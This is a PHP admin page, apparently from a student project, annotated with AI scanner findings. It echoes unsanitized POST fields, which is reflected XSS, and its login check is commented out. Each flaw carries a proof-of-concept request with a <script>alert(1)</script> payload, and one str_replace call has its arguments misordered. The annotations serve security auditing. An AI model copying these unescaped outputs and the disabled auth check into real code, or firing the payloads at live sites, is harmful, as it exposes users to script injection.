<?php

session_start();
//Si le mec n'est pas connecté et est arrivé un peu par hasard sur cette
//page, autant le faire partir tout de suite, il n'a pas le droit
if (empty($_SESSION['mail'])){
	//header('Location: gerer.php');
}else{
	$utilisateur = $_SESSION['mail'];
}

if (isset($_POST))
{
    //VERIFY: AI XSS issue #113, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/113, 4d6447bf
    //AI exploit:
    //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
    //Host: localhost
    //Accept-Encoding: identity
    //Connection: close
    //Content-Length: 0
    echo $_POST['v'];
    //FP: AI XSS issue #113, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/113, 02cd44d8
    //AI exploit:
    //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
    //Host: localhost
    //Accept-Encoding: identity
    //Connection: close
    //Content-Type: application/x-www-form-urlencoded
    //Content-Length: 41
    //
    //a=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    echo $_POST['a'];
    //TODO: AI XSS issue #113, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/113, 3196137a
    //AI exploit:
    //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
    //Host: localhost
    //Accept-Encoding: identity
    //Connection: close
    //Content-Type: application/x-www-form-urlencoded
    //Content-Length: 41
    //
    //b=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    echo $_POST['b'];
    //TODO: AI XSS issue #113, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/113, 98d536bc
    //AI exploit:
    //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
    //Host: localhost
    //Accept-Encoding: identity
    //Connection: close
    //Content-Type: application/x-www-form-urlencoded
    //Content-Length: 41
    //
    //c=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    echo $_POST['c'];
    //TODO: AI XSS issue #113, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/113, bb499953
    //AI exploit:
    //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
    //Host: localhost
    //Accept-Encoding: identity
    //Connection: close
    //Content-Type: application/x-www-form-urlencoded
    //Content-Length: 41
    //
    //d=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    echo $_POST['d'];
    //TODO: AI XSS issue #113, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/113, 47682e6e
    //AI exploit:
    //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
    //Host: localhost
    //Accept-Encoding: identity
    //Connection: close
    //Content-Type: application/x-www-form-urlencoded
    //Content-Length: 41
    //
    //e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    echo $_POST['e'];
    //VERIFY: AI XSS issue #113, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/113, 49870458
    //AI exploit:
    //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-f254c7b/admin.php HTTP/1.1
    //Host: localhost
    //Accept-Encoding: identity
    //Connection: close
    //Content-Type: application/x-www-form-urlencoded
    //Content-Length: 41
    //
    //f=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    echo str_replace($_POST['f'], "\"", "'");
}


?>
